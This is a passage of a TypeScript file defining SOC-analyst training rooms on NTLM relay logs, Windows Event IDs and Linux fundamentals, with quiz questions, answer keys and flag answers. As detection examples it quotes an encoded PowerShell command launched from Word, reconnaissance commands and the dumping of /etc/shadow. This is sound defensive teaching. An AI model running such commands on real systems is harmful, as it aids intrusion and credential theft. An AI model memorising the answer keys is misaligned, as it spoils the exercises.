        "Your SIEM has correlated two events on the internal network within an 8-second window: a burst of LLMNR broadcast traffic on UDP port 5355, followed immediately by a Windows authentication event where the WorkstationName field does not match the IP address the logon actually originated from. Review the authentication event below and answer the questions.",
      event: {
        id: "ad-ntlm-evt-001",
        ts: "2024-11-18T14:02:37.000Z",
        source: "ad",
        vendor: "Windows Security",
        event_type: "auth_success",
        severity: "high",
        hostname: "SRV-FILE02.corp.contoso.com",
        description:
          "l.harper's account authenticated to SRV-FILE02 via NTLM, but the claimed WorkstationName does not match the source IP address of the connection",
        mitre_technique: "T1557.001",
        mitre_tactic: "Credential Access",
        authentication: {
          method: "NTLM",
          result: "Success",
          logon_type: 3,
        },
        raw: {
          "event.code": "4624",
          "winlog.channel": "Security",
          "winlog.computer_name": "SRV-FILE02.corp.contoso.com",
          "winlog.event_data.TargetUserName": "l.harper",
          "winlog.event_data.TargetDomainName": "CORP",
          "winlog.event_data.LogonType": "3",
          "winlog.event_data.AuthenticationPackageName": "NTLM",
          "winlog.event_data.WorkstationName": "WKS-L-HARPER",
          "winlog.event_data.IpAddress": "10.20.4.91",
          "winlog.event_data.IpPort": "51122",
          "asset.cmdb_lookup_10.20.4.91": "No matching entry in asset inventory or CMDB for this IP",
          "asset.dhcp_lease_WKS-L-HARPER": "10.20.4.47 (per DHCP lease table)",
          "winlog.event_id": 4624,
          "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
        },
      },
      questions: [
        {
          question:
            "The WorkstationName field says 'WKS-L-HARPER', but the DHCP lease table shows l.harper's real machine is assigned IP 10.20.4.47 — not 10.20.4.91, the IpAddress this login actually came from. What does this mismatch indicate?",
          options: [
            "l.harper has two computers and simply logged in from a secondary device",
            "This is a normal event — WorkstationName is a free-text field that Windows does not validate, so mismatches are expected and meaningless",
            "This is the signature of an NTLM relay attack: the attacker's rogue machine (10.20.4.91) is relaying l.harper's captured NTLM authentication to SRV-FILE02, while the WorkstationName field still shows the name of l.harper's real workstation because that value came from l.harper's original, poisoned authentication attempt",
            "The DHCP lease table is stale and should be ignored in favour of the WorkstationName field",
          ],
          answer: 2,
          explanation:
            "WorkstationName is populated by the client during authentication and is not independently verified by the server — which is exactly why it becomes a giveaway in a relay attack. l.harper's machine legitimately claims to be WKS-L-HARPER, but that authentication attempt was captured and relayed by a rogue device at 10.20.4.91 (not in the asset inventory), which forwarded it to SRV-FILE02. The server sees a login that says 'I am WKS-L-HARPER' arriving from an IP that has never been assigned to that hostname — a mismatch that is very hard to produce through any normal, non-attack scenario.",
          xp: 35,
        },
        {
          question:
            "Given that this is a suspected NTLM relay, what is the SOC analyst's most appropriate immediate action?",
          options: [
            "Reset l.harper's password — this alone fully remediates NTLM relay attacks",
            "Isolate/quarantine the unmanaged device at 10.20.4.91 from the network, disable or reset l.harper's credentials and any sessions established via the relayed authentication, and open an investigation into how an unmanaged device is present on the internal subnet at all — since it must be running Responder or a similar poisoning tool to have captured the original LLMNR broadcast",
            "Ignore it — NTLM relay requires domain admin credentials to succeed, so a normal user account being relayed poses no real risk",
            "Block UDP port 5355 only on SRV-FILE02, since that is the only host affected",
          ],
          answer: 1,
          explanation:
            "Resetting the password alone doesn't help — NTLM relay doesn't require knowing the password at all, so a reset doesn't retroactively undo the session that was already established via the relayed authentication. The correct response combines containment (isolate the rogue device, since its mere presence indicates active LLMNR/NTLM poisoning tooling on the internal network), credential/session remediation for the affected account, and a wider investigation, because the attacker's device is a durable threat to every other machine on that subnet until it is removed — this was never limited to a single host or a single user.",
          xp: 35,
        },
      ],
    } satisfies LogAnalysisTask,

    // -------------------------------------------------------------------------
    // Flag Task — NTLM Relay
    // -------------------------------------------------------------------------
    {
      type: "flag",
      id: "ad-flag2",
      prompt:
        "Look at the NTLM relay log analysis event above. What is the exact PreAuthType-style detection field that revealed the mismatch — specifically, what IP address did the relayed authentication actually originate from (the 'IpAddress' field in the raw log)? Enter the exact IP address.",
      answer: "10.20.4.91",
      hint: "Look at the 'winlog.event_data.IpAddress' field in the raw log — this is the true network source of the NTLM authentication, which does not match the claimed WorkstationName's real device.",
      xp: 35,
    } satisfies FlagTask,
  ],
};

// ---------------------------------------------------------------------------
// Room 2 — Windows Event Logs
// ---------------------------------------------------------------------------

const windowsEventLogs: Room = {
  id: "windows-event-logs",
  title: "Windows Event Logs",
  description:
    "Windows writes a detailed diary of everything that happens on a system. Learn to read that diary — critical Event IDs, logon types, failure codes — and identify attacks hidden inside authentication and process logs.",
  difficulty: "intermediate",
  category: "Log Analysis",
  estimatedMinutes: 50,
  xp: 450,
  icon: "📋",
  prerequisites: ["windows-fundamentals"],
  tasks: [
    // -------------------------------------------------------------------------
    // Reading 1 — What Are Windows Event Logs
    // -------------------------------------------------------------------------
    {
      type: "reading",
      id: "win-evtlogs-r1",
      heading: "Windows Event Logs — The System's Black Box",
      content: `Think of the black box recorder on an aeroplane. Every flight, it silently records everything: engine speed, altitude, control inputs. If something goes wrong, investigators pull the black box and reconstruct exactly what happened. **Windows Event Logs are the black box of a computer**. Every login attempt, every file opened, every process started, every permission change — Windows writes a record of it.\n\nWith Event Logs, a SOC analyst can answer questions like:\n- "Did someone log in at 3 AM when the office was closed?"\n- "What process created that suspicious executable?"\n- "Was the audit log itself cleared — possibly by an attacker covering their tracks?"\n- "Which user account was added to the Domain Admins group?"\n\nWithout Event Logs, investigating a security incident would be like trying to solve a crime with no witnesses, no cameras, and no fingerprints. With them, you can often reconstruct an entire attack chain.\n\n**Where to Find Event Logs**\n\nOn any Windows computer, open the **Event Viewer** application (search for it in the Start menu, or run \`eventvwr.msc\`). You will see logs organised into channels:\n\n- **Windows Logs**:\n  - **Security**: Authentication events, privilege changes, account management, policy changes. This is where SOC analysts spend most of their time.\n  - **System**: Operating system events — drivers loading, services starting/stopping, system errors.\n  - **Application**: Events from installed applications.\n\n- **Applications and Services Logs**:\n  - **Microsoft > Windows > PowerShell > Operational**: PowerShell script execution — critical for detecting attacker activity since attackers heavily use PowerShell.\n  - **Microsoft > Windows > Sysmon > Operational**: If Sysmon (a free Microsoft tool) is installed, this log contains highly detailed process creation, network connection, and file creation events.\n  - **Microsoft > Windows > TaskScheduler > Operational**: Scheduled tasks — a common attacker persistence mechanism.\n\nLogs are stored as **.evtx** files in \`C:\\Windows\\System32\\winevt\\Logs\\\`. You can open these files directly in Event Viewer or load them into a SIEM.\n\n**Event Structure**\n\nEvery log entry has the same structure:\n\n- **EventID**: The most important field. A number that tells you exactly what happened. Event ID 4624 always means "successful logon". Event ID 4625 always means "failed logon". These IDs are standardised across all Windows versions.\n- **TimeCreated**: When the event happened (in UTC on modern systems).\n- **Level**: Information / Warning / Error / Critical.\n- **Channel**: Which log it belongs to (Security, System, etc.).\n- **Computer**: The hostname where the event was generated.\n- **EventData**: The details — who, what, from where. Different for each EventID.\n- **Keywords**: Audit Success or Audit Failure (visible in Security log).\n\n**Audit Policies — Turning Logs On**\n\nMany event IDs only generate logs if the corresponding **Audit Policy** is enabled. For example, Event ID 4688 (new process created) requires "Audit Process Creation" to be enabled, and to see the command line, you must also enable "Include command line in process creation events" via Group Policy. By default, many audit policies are OFF. One of the first questions to ask when joining a new organisation as a SOC analyst: "What audit policies are enabled?"\n\n**Collecting Logs at Scale**\n\nA company with 5,000 computers cannot have analysts log into each machine to check Event Viewer. Logs must flow to a central location:\n\n- **Windows Event Forwarding (WEF) / Windows Event Collector (WEC)**: Built into Windows. Computers forward their events to a central collector server using WinRM. Free but requires configuration.\n- **Winlogbeat**: An open-source agent (from Elastic) installed on each machine. Ships logs to Elasticsearch/Kibana in real time. Very common in SOC environments.\n- **Splunk Universal Forwarder / Microsoft Sentinel agent / Wazuh agent**: Other popular log collection agents.\n\nAll of these feed a central **SIEM** (Security Information and Event Management system) where analysts can search across millions of events from thousands of machines simultaneously.`,
    } satisfies ReadingTask,

    // -------------------------------------------------------------------------
    // Reading 2 — Critical Event IDs
    // -------------------------------------------------------------------------
    {
      type: "reading",
      id: "win-evtlogs-r2",
      heading: "Critical Security Event IDs Every SOC Analyst Must Know",
      content: `The Security event log can generate thousands of events per hour on a busy server. You cannot read them all. What you can do is know which EventIDs matter most, understand what each field means, and build alerts that fire when something suspicious happens. Here are the most important ones:\n\n**Authentication Events**\n\n**Event ID 4624 — Successful Logon**\nSomeone (or something) logged in successfully. The critical sub-field is **LogonType**:\n- LogonType **2** = Interactive — physically at the keyboard (console logon)\n- LogonType **3** = Network — accessing a shared folder, file server, or SMB resource remotely (no credentials cached, authentication happens over the wire)\n- LogonType **4** = Batch — a scheduled task ran under this account\n- LogonType **5** = Service — a Windows service started using this account\n- LogonType **7** = Unlock — workstation unlocked after screensaver\n- LogonType **10** = RemoteInteractive — RDP (Remote Desktop Protocol) session\n- LogonType **11** = CachedInteractive — laptop logon while offline, using cached credentials\nLateral movement often appears as **LogonType 3** from one machine to another. An admin account logging in interactively to a user workstation (LogonType 2) is unusual and worth investigating.\n\n**Event ID 4625 — Failed Logon**\nThe login attempt failed. Key sub-fields:\n- **TargetUserName**: Which account was targeted\n- **IpAddress**: Where the attempt came from\n- **LogonType**: Same values as 4624 — Type 3 failures can indicate password spraying\n- **SubStatus** (failure reason codes):\n  - **0xC000006A**: Wrong password (the account exists, the password was just wrong)\n  - **0xC0000064**: No such user (the username does not exist in the domain)\n  - **0xC000006D**: General logon failure\n  - **0xC0000234**: Account locked out\n  - **0xC0000072**: Account disabled\n  - **0xC000015B**: Logon type not granted\nDetection pattern: Many 4625 events with status **0xC000006A** (wrong password, account exists) from one IP targeting multiple accounts = **password spray**. Many 4625 with status **0xC0000064** (no such user) from one IP = **username enumeration**.\n\n**Event ID 4648 — Logon Using Explicit Credentials**\nFired when credentials are specified explicitly (e.g., using the \`runas\` command, or when an application like PsExec passes a username and password). This is how lateral movement often looks — an attacker runs PsExec with stolen credentials to execute commands on a remote machine. You will see 4648 on the **source** machine (where the attacker ran the command) alongside 4624 LogonType 3 on the **target** machine.\n\n**Event ID 4672 — Special Privileges Assigned to New Logon**\nFires every time an account with administrative privileges logs in. "Special privileges" include SeDebugPrivilege (read any process memory), SeBackupPrivilege, SeTakeOwnershipPrivilege. This event by itself is normal — but it gives you a complete list of every admin logon. If you see 4672 for an account that should not have admin rights, investigate immediately.\n\n**Process and Execution Events**\n\n**Event ID 4688 — New Process Created**\nA new process (program) was started. Critical for detecting malware and attacker tools. Key fields:\n- **NewProcessName**: The full path of the executable\n- **CommandLine**: The full command line (only visible if "Include command line in process creation events" audit policy is enabled)\n- **ParentProcessName**: What launched this process\n- **SubjectUserName**: Which user account created the process\nSuspicious patterns: \`cmd.exe\` or \`powershell.exe\` spawned by \`outlook.exe\` or \`winword.exe\` (phishing macro), \`whoami /all\` or \`net group "Domain Admins"\` (reconnaissance), base64-encoded PowerShell commands (\`-EncodedCommand\`).\n\n**Account Management Events**\n\n**Event ID 4720 — User Account Created**: A new user was created. Any new account should be verified against an IT change ticket.\n**Event ID 4728 — Member Added to Security-Enabled Global Group**: Someone was added to a group. If the group is "Domain Admins" or "Enterprise Admins" and it was not expected, this is a critical alert.\n**Event ID 4732 — Member Added to Security-Enabled Local Group**: Similar but for local machine groups. Addition to "Administrators" local group is common for privilege escalation.\n\n**Persistence and Covering Tracks**\n\n**Event ID 4698 — Scheduled Task Created**: Attackers frequently create scheduled tasks to maintain persistence — a task that runs their malware every hour even if the machine reboots.\n**Event ID 4702 — Scheduled Task Updated**: An existing scheduled task was modified. Could be an attacker modifying a legitimate task.\n**Event ID 7045 — New Service Installed**: A new Windows service was installed. Malware commonly installs itself as a Windows service (e.g., many RATs and backdoors). This event is in the **System** log, not Security.\n**Event ID 1102 — Audit Log Cleared**: The Security event log was deliberately cleared. This is almost always an attacker removing evidence. Legitimate administrators almost never need to clear the Security log. This should trigger an immediate P1 alert in any SOC.\n\n**Kerberos Events**\n\n**Event ID 4768 — Kerberos TGT Requested**: See the AD room for full details. Watch for RC4 encryption and failures.\n**Event ID 4769 — Kerberos Service Ticket Requested**: Watch for EncryptionType 0x17 (RC4) — Kerberoasting indicator.\n**Event ID 4776 — NTLM Authentication Attempt**: NTLM is the older, weaker authentication protocol. Modern environments using Kerberos should have very few 4776 events. High volumes can indicate Pass-the-Hash attempts or old misconfigured systems.`,
    } satisfies ReadingTask,

    // -------------------------------------------------------------------------
    // Reading 3 — Detection Patterns and Log Collection
    // -------------------------------------------------------------------------
    {
      type: "reading",
      id: "win-evtlogs-r3",
      heading: "Attack Patterns in Event Logs and How to Build Detections",
      content: `Knowing individual Event IDs is only step one. Real SOC work is about recognising **patterns** — combinations and sequences of events that together tell a story of an attack.\n\n**Pattern 1: Password Spray Attack**\nA password spray is when an attacker tries one common password (like "Company2024!" or "Summer2024") against many different user accounts. It is the opposite of brute force (many passwords against one account). Spraying is effective because most accounts will not lock out — only the correct accounts get a match — and it avoids lockout thresholds.\n\nWhat you see in logs:\n- Dozens or hundreds of **Event ID 4625** (failed logon) within a short time window\n- **LogonType 3** (network) — the attacker is not physically present\n- **SubStatus 0xC000006A** (wrong password) — consistent, meaning the accounts DO exist\n- **Multiple different TargetUserNames** from the **same IpAddress**\n- Possibly 1–2 **Event ID 4624** (successful logon) at the end — indicating the spray found a valid credential\n\nResponse: Block the source IP, check if any account had a successful logon (4624) immediately following the failures, reset any accounts that were successfully compromised, alert the user.\n\n**Pattern 2: Lateral Movement**\nOnce inside the network, attackers move horizontally — from the initial foothold machine to other more valuable systems (servers, domain controllers).\n\nWhat you see in logs:\n- **Event ID 4624 LogonType 3** on a server, with the source address being a **workstation** (unusual — workstations rarely initiate network logons to servers without user action)\n- The account used may be a **local administrator account** with the same password across multiple machines (common misconfiguration)\n- Shortly after, **Event ID 4688** on the server showing reconnaissance commands (whoami, ipconfig, net group)\n- Possibly **Event ID 4648** on the source workstation showing explicit credential use\n\n**Pattern 3: Privilege Escalation**\nAn attacker who gained access as a low-privilege user attempts to gain admin rights.\n\nWhat you see in logs:\n- **Event ID 4728 or 4732** — user added to an admin group\n- **Event ID 4672** appearing for that account on the next logon\n- The account performing the change may itself be a recently compromised account\n\n**Pattern 4: Persistence via Scheduled Task**\nAn attacker creates a scheduled task to maintain access even if their initial foothold is discovered and removed.\n\nWhat you see in logs:\n- **Event ID 4698** — new scheduled task created\n- The task runs from an unusual location (\`C:\\Users\\Public\\\`, \`C:\\Temp\\\`, \`C:\\ProgramData\\\`)\n- The task runs under **SYSTEM** or an admin account\n- **Event ID 4688** showing the task executing at the scheduled time\n\n**Pattern 5: Log Clearing (Last Resort Attacker Action)**\n- **Event ID 1102** — Security log cleared\n- This often means the attacker is done and cleaning up, OR they became alarmed and are trying to erase evidence\n- Even if the log is cleared, events may still exist in SIEM if forwarding was in place\n- Always check SIEM for activity in the minutes/hours before the log clear event\n\n**Correlating Events Across Machines**\n\nA single event on a single machine rarely tells the full story. The power of a SIEM is correlating events across thousands of machines:\n- 4625 failures on DC01 + 4624 success on FILESERVER01 from same IP = lateral movement\n- 4688 (whoami) on WORKSTATION15 + 4648 on WORKSTATION15 + 4624 LogonType3 on DC01 from WORKSTATION15 = lateral movement to DC\n\n**Investigation Workflow**\nWhen an alert fires:\n1. Identify the **who** (user account), **what** (Event ID), **when** (timestamp), **where** (source and destination machines), and **from where** (source IP)\n2. Look back in time: what happened before this event on the same machine?\n3. Look at other machines: is the same account active on multiple systems simultaneously?\n4. Look forward: what happened after this event?\n5. Check if the account has a legitimate reason for this activity (are they in IT? is this during business hours? does a change ticket exist?)\n6. Escalate or close based on findings`,
    } satisfies ReadingTask,

    // -------------------------------------------------------------------------
    // Question 1
    // -------------------------------------------------------------------------
    {
      type: "question",
      id: "win-evtlogs-q1",
      question:
        "You see Event ID 4624 on SERVER01. The LogonType field is 3, and the IpAddress is the IP of a user workstation (WKST22). Why is this potentially suspicious and what attack technique does it suggest?",
      options: [
        "LogonType 3 is an interactive console logon — this means an attacker is physically at SERVER01's keyboard",
        "LogonType 3 is a network logon, meaning a process on WKST22 authenticated to SERVER01 over the network — this is unusual because users do not normally initiate network logons from their workstations to servers, suggesting lateral movement",
        "LogonType 3 indicates the account password was wrong — this is just a failed login attempt",
        "LogonType 3 is an RDP session — the user is using Remote Desktop, which is completely normal",
      ],
      answer: 1,
      explanation:
        "LogonType 3 = network logon. This means a process on WKST22 authenticated to SERVER01 across the network (like accessing a file share or using PsExec/WMI to run commands). Normal users do not typically initiate network logons to servers unless explicitly accessing shared resources. This pattern — workstation-to-server network logon, especially if the account does not usually do this — is a classic lateral movement indicator. LogonType 10 = RDP, not 3.",
      xp: 25,
    } satisfies QuestionTask,

    // -------------------------------------------------------------------------
    // Log Analysis — Password Spray (Event ID 4625)
    // -------------------------------------------------------------------------
    {
      type: "log_analysis",
      id: "win-evtlogs-la1",
      heading: "Detecting a Password Spray Attack",
      context:
        "Your SIEM has generated an alert: 'High volume of failed logon events from external IP'. You pull one representative event from the wave of failures. The pattern has repeated for 47 different usernames from the same IP in the past 8 minutes.",
      event: {
        id: "win-spray-evt-001",
        ts: "2024-11-20T08:43:17.000Z",
        source: "windows_security",
        vendor: "Windows Security",
        event_type: "auth_failure",
        severity: "high",
        hostname: "DC01.corp.contoso.com",
        description:
          "Failed logon attempt — part of high-volume password spray from external IP",
        mitre_technique: "T1110.003",
        mitre_tactic: "Credential Access",
        authentication: {
          method: "NTLM",
          result: "Failure",
          logon_type: 3,
        },
        src_ip: "203.0.113.45",
        geo: { country: "Russia", city: "Moscow" },
        raw: {
          "event.code": "4625",
          "winlog.channel": "Security",
          "winlog.computer_name": "DC01.corp.contoso.com",
          "winlog.event_data.TargetUserName": "j.smith",
          "winlog.event_data.TargetDomainName": "CORP",
          "winlog.event_data.LogonType": "3",
          "winlog.event_data.SubStatus": "0xC000006A",
          "winlog.event_data.Status": "0xC000006D",
          "winlog.event_data.WorkstationName": "-",
          "winlog.event_data.IpAddress": "203.0.113.45",
          "winlog.event_data.IpPort": "0",
          "winlog.event_data.AuthenticationPackageName": "NTLM",
          "winlog.event_data.LogonProcessName": "NtLmSsp",
          "winlog.event_id": 4625,
          "winlog.keywords": "Audit Failure",
          "@timestamp": "2024-11-20T08:43:17.000Z",
        },
      } satisfies TelemetryEvent,
      questions: [
        {
          question:
            "The SubStatus field shows 0xC000006A. What does this tell you about the account 'j.smith'?",
          options: [
            "0xC000006A means the account does not exist — the attacker is guessing random usernames",
            "0xC000006A means the account exists but the password was wrong — j.smith is a real account in the domain, so the attacker already knows valid usernames",
            "0xC000006A means the account is locked out due to too many failed attempts",
            "0xC000006A means the account has been disabled by an administrator",
          ],
          answer: 1,
          explanation:
            "SubStatus 0xC000006A = 'Wrong Password' — meaning the username j.smith IS a valid account in the domain, but the password attempt was incorrect. This is dangerous because it confirms the attacker has a list of real usernames (possibly obtained from OSINT, LinkedIn, or a prior breach). If the same SubStatus appears for 47 different accounts in 8 minutes, the attacker is spraying one password across all valid accounts.",
          xp: 30,
        },
        {
          question:
            "The LogonType is 3 and the IpAddress is 203.0.113.45 (geolocated to Moscow). What is the correct immediate response?",
          options: [
            "Wait and see — one failed logon is not significant",
            "Block 203.0.113.45 at the perimeter firewall, search the SIEM for any Event ID 4624 (success) from this IP in the same window, reset any compromised accounts, and alert the security team",
            "Delete the j.smith account immediately",
            "Clear the Security event log so the attacker does not know they were detected",
          ],
          answer: 1,
          explanation:
            "The immediate priority is containment (block the source IP), followed by determining if any account was successfully compromised (look for 4624 from the same IP). Resetting any successfully sprayed account's password is critical before the attacker can use the credential. Never clear logs — that destroys the evidence trail needed for investigation.",
          xp: 25,
        },
      ],
    } satisfies LogAnalysisTask,

    // -------------------------------------------------------------------------
    // Question 2 — Event ID 1102
    // -------------------------------------------------------------------------
    {
      type: "question",
      id: "win-evtlogs-q2",
      question:
        "At 11:47 PM on a Saturday, Event ID 1102 appears in your SIEM from a Domain Controller. What does this mean and how urgent is it?",
      options: [
        "A new admin account was created — moderate urgency, verify with IT on Monday",
        "The Security audit log was cleared — this is a critical P1 indicator that an attacker may be erasing their tracks; escalate immediately",
        "A scheduled backup job cleared old logs as part of routine maintenance — this is expected",
        "A user locked out their account — low urgency, unlock the account",
      ],
      answer: 1,
      explanation:
        "Event ID 1102 = 'The audit log was cleared'. Legitimate administrators almost never need to clear the Security log. Clearing it is a common attacker tactic to erase the evidence of their actions before abandoning a compromised machine. The Saturday night timestamp makes it even more suspicious (attackers often act after business hours). This should trigger an immediate P1 response. Check your SIEM for any events that were forwarded before the clear, and investigate what happened on that DC in the preceding hours.",
      xp: 30,
    } satisfies QuestionTask,

    // -------------------------------------------------------------------------
    // Question 3 — 4688 command line
    // -------------------------------------------------------------------------
    {
      type: "question",
      id: "win-evtlogs-q3",
      question:
        "Event ID 4688 shows a new process created: NewProcessName = 'C:\\Windows\\System32\\cmd.exe', ParentProcessName = 'C:\\Program Files\\Microsoft Office\\Office16\\WINWORD.EXE', CommandLine = 'cmd.exe /c powershell -EncodedCommand JABjACA9...'. What does this indicate?",
      options: [
        "A user opened a command prompt window from inside Microsoft Word — completely normal for office workers",
        "Microsoft Word spawned a Command Prompt which then ran an encoded PowerShell command — this is a classic indicator of a malicious macro executing a payload, consistent with a phishing email attack",
        "The Windows Update service is running PowerShell as part of a patch — this is scheduled maintenance",
        "A developer compiled code inside Word using the built-in terminal",
      ],
      answer: 1,
      explanation:
        "Legitimate users do not spawn cmd.exe from inside Microsoft Word. This pattern — Office application → cmd.exe → PowerShell — is the textbook signature of a malicious macro (often delivered via phishing email). The '-EncodedCommand' flag hides the PowerShell payload in base64 to evade text-based detection. Decode the base64 string immediately to see what the script does (it is likely downloading a second-stage payload or establishing a reverse shell). This should be treated as a confirmed malware incident.",
      xp: 35,
    } satisfies QuestionTask,

    // -------------------------------------------------------------------------
    // Flag Task
    // -------------------------------------------------------------------------
    {
      type: "flag",
      id: "win-evtlogs-flag1",
      prompt:
        "Look at the log analysis event above (Event ID 4625 — password spray). What is the exact SubStatus value shown in the raw log that tells you the account exists but the password was wrong? Enter it exactly (e.g. 0xC000006A).",
      answer: "0xC000006A",
      hint: "Find the 'winlog.event_data.SubStatus' field in the raw log. SubStatus codes are hexadecimal values starting with '0xC'. The one for 'wrong password' begins with 0xC000006.",
      xp: 30,
    } satisfies FlagTask,

    // -------------------------------------------------------------------------
    // Question 4 — LogonType
    // -------------------------------------------------------------------------
    {
      type: "question",
      id: "win-evtlogs-q4",
      question:
        "Which LogonType in Event ID 4624 indicates that a user connected via Remote Desktop Protocol (RDP)?",
      options: [
        "LogonType 2 — Interactive (console)",
        "LogonType 3 — Network (file share)",
        "LogonType 10 — RemoteInteractive (RDP)",
        "LogonType 5 — Service",
      ],
      answer: 2,
      explanation:
        "LogonType 10 = RemoteInteractive, which is the value for RDP sessions. LogonType 2 is a console logon (physically at the keyboard). LogonType 3 is a network logon (accessing shared resources like file shares). LogonType 5 is a service account logon when a Windows service starts. Knowing these values is essential for understanding how a user or attacker accessed a system.",
      xp: 20,
    } satisfies QuestionTask,
  ],
};

// ---------------------------------------------------------------------------
// Room 3 — Linux Fundamentals for SOC Analysts
// ---------------------------------------------------------------------------

const linuxFundamentals: Room = {
  id: "linux-fundamentals",
  title: "Linux Fundamentals for SOC Analysts",
  description:
    "Most servers, cloud infrastructure, and security tools run on Linux. Learn the filesystem, permissions, users, processes, and key commands that every SOC analyst needs when investigating Linux systems.",
  difficulty: "beginner",
  category: "Endpoint Security",
  estimatedMinutes: 45,
  xp: 350,
  icon: "🐧",
  prerequisites: ["networking-fundamentals"],
  tasks: [
    // -------------------------------------------------------------------------
    // Reading 1 — Why Linux and the Filesystem
    // -------------------------------------------------------------------------
    {
      type: "reading",
      id: "linux-fund-r1",
      heading: "Linux — The Invisible OS Running the Internet",
      content: `You may never have seen Linux before. It does not have a start menu or colourful desktop icons. But here is the truth: Linux runs approximately **96% of the world's web servers**, virtually all cloud infrastructure (AWS, Azure, GCP), most IoT devices, Android smartphones, and — most relevant to you — nearly every security tool you will use as a SOC analyst, including Wazuh, Elastic Stack, and Splunk. Understanding Linux is not optional for a modern SOC analyst. It is as essential as knowing how to drive is for a police officer.\n\nThink of Linux like the engine of a car — most users never see it, but mechanics (and security analysts) need to understand it deeply.\n\n**The Filesystem Hierarchy — Everything Has a Place**\n\nWindows organises files into drives (C:, D:). Linux has one unified tree that starts at the **root directory** (\`/\`). Everything — files, devices, network interfaces — is a file or directory somewhere in this tree. Knowing where things live is critical for investigations:\n\n- **\`/\`** — Root. The top of the entire filesystem. Only root (the superuser) can write here.\n- **\`/etc\`** — "Et cetera" — system configuration files. Critical for SOC analysts:\n  - \`/etc/passwd\` — list of all user accounts\n  - \`/etc/shadow\` — hashed passwords (readable only by root)\n  - \`/etc/group\` — group membership\n  - \`/etc/sudoers\` — who can run commands as root\n  - \`/etc/ssh/sshd_config\` — SSH server configuration\n  - \`/etc/cron.d/\` — system-wide cron job definitions\n- **\`/var/log\`** — Variable data that grows: **log files**. SSH logs, authentication logs, web server logs, system logs. This directory is where you spend most of your time during Linux investigations.\n- **\`/tmp\`** — Temporary files. World-writable (any user can write here). Malware and attackers frequently drop files in /tmp because no special permissions are needed. Always check /tmp during an investigation.\n- **\`/home\`** — User home directories. \`/home/alice\` is Alice's personal space. Contains .ssh (SSH keys), .bash_history (command history), and personal files.\n- **\`/bin\`** and **\`/usr/bin\`** — Essential system commands and user programs. Things like \`ls\`, \`cat\`, \`grep\`, \`ps\`. Attackers sometimes replace legitimate binaries here with modified versions (rootkits).\n- **\`/sbin\`** and **\`/usr/sbin\`** — System administration binaries (commands usually run as root). \`iptables\`, \`useradd\`, \`fdisk\`.\n- **\`/proc\`** — A **virtual filesystem** that does not exist on disk. The kernel creates it in memory. It gives you a window into every running process and network connection:\n  - \`/proc/PID/exe\` — the executable for process with that PID\n  - \`/proc/PID/cmdline\` — the full command line that started the process\n  - \`/proc/PID/net/tcp\` — all active TCP connections\n  - \`/proc/PID/maps\` — memory map of the process\n- **\`/sys\`** — Another virtual filesystem exposing hardware and kernel settings.\n- **\`/dev\`** — Device files. \`/dev/sda\` is your hard drive. \`/dev/null\` is the "black hole" — data written here disappears.\n- **\`/opt\`** — Optional third-party software. Many security tools install here.\n- **\`/root\`** — The home directory of the root (superuser) account.\n\n**Why /tmp, /var/tmp, and /dev/shm Are Red Flags**\n\nThese three directories are writable by any user without special permissions:\n- \`/tmp\` — cleared on reboot on most systems\n- \`/var/tmp\` — persists across reboots (more dangerous for persistence)\n- \`/dev/shm\` — shared memory, backed by RAM, leaves no disk trace\n\nAttackers use these to download and execute malware. A process running from \`/tmp/update\` or \`/dev/shm/kworker\` should immediately raise suspicion — these paths are not where legitimate software lives.\n\n**Key Analyst Commands**\n\nWhen you SSH into a Linux system during an investigation, these commands give you situational awareness:\n\n- \`ls -la\` — List all files including hidden ones (starting with .) with permissions and timestamps\n- \`ps aux\` — List all running processes with their user, PID, and command line\n- \`netstat -tulpn\` or \`ss -tulpn\` — Show all open network ports and which process owns each one\n- \`find /tmp -type f -newer /etc/passwd\` — Find files in /tmp newer than the passwd file (recently created)\n- \`grep -r "Failed password" /var/log/\` — Search for SSH failures across all log files\n- \`cat /proc/1234/cmdline\` — See the full command line of process 1234\n- \`tail -f /var/log/auth.log\` — Watch the authentication log in real time\n- \`who\` and \`w\` — See who is currently logged in\n- \`last\` — Show recent login history`,
    } satisfies ReadingTask,

    // -------------------------------------------------------------------------
    // Reading 2 — Users, Permissions, and sudo
    // -------------------------------------------------------------------------
    {
      type: "reading",
      id: "linux-fund-r2",
      heading: "Users, File Permissions, and the sudo System",
      content: `Linux enforces the principle of least privilege through a strict permissions system. Every file and every process belongs to a specific user and group, and permissions control exactly who can do what. Understanding this is crucial both for securing systems and for investigating compromises.\n\n**Users and Groups**\n\nLinux user accounts are stored in \`/etc/passwd\`. Each line has seven colon-separated fields:\n\`\`\`\nalice:x:1001:1001:Alice Smith:/home/alice:/bin/bash\n  ^    ^  ^    ^      ^            ^            ^\n  |    |  |    |    Comment      Home          Shell\n username | UID  GID             directory\n          |\n        password (x = stored in /etc/shadow)\n\`\`\`\n\n- **UID (User ID)**: A number identifying the user. UID 0 = root (superuser). UID 1–999 = system accounts. UID 1000+ = human users.\n- **GID (Group ID)**: Primary group. Group memberships are in \`/etc/group\`.\n- **Shell**: The program that runs when the user logs in. \`/bin/bash\` is normal. \`/sbin/nologin\` or \`/bin/false\` means the account cannot log in interactively (used for service accounts).\n\nPasswords are never stored in \`/etc/passwd\` — only an 'x' placeholder. The actual hashed passwords are in \`/etc/shadow\`, readable only by root:\n\`\`\`\nalice:$6$salt$longhashstring...:18987:0:99999:7:::\n\`\`\`\nThe \`$6$\` prefix means SHA-512. Attackers who gain root access often dump /etc/shadow and attempt offline password cracking.\n\n**File Permissions**\n\nEvery file and directory has three permission sets:\n- **Owner (u)**: The user who owns the file\n- **Group (g)**: Members of the file's group\n- **Others (o)**: Everyone else\n\nAnd three permission types:\n- **r (read)**: Can view the file content or list directory contents\n- **w (write)**: Can modify the file or create/delete files in the directory\n- **x (execute)**: Can run the file as a program, or enter the directory (\`cd\` into it)\n\nExample output of \`ls -la\`:\n\`\`\`\n-rwxr-xr-- 1 alice devs 4096 Nov 14 10:32 deploy.sh\n ^^^ ^^^ ^^^\n  |   |   |\n Owner Group Others\n (alice)(devs)(everyone)\n\`\`\`\nReading: alice=rwx (can read/write/execute), devs group=r-x (can read and execute, not write), everyone else=r-- (read only).\n\nThe leading \`-\` means it is a regular file. \`d\` means directory, \`l\` means symbolic link.\n\n**Numeric Permission Notation**\nPermissions can also be expressed as a 3-digit octal number:\n- r = 4, w = 2, x = 1\n- Add them up: rwx = 7, rw- = 6, r-x = 5, r-- = 4, --- = 0\n- \`chmod 755 file\` = rwxr-xr-x (owner: full, group: 